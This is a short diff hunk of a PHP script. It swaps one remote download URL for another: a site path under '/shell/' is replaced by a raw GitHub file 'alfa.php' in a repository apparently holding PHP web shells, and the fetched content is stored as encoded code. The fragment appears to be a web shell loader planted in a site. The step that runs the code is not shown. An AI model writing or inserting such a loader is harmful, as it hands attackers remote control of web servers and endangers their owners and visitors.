@@ -20,7 +20,7 @@ curl_close($ch);
 return $result;
 }
 
-$url = 'https://miawseo.site/shell/911g.txt';
+$url = 'https://raw.githubusercontent.com/drian-o/alfashelss/refs/heads/main/alfa.php';
 $encoded_code = get_contents($url);
 
 if ($encoded_code === false) {
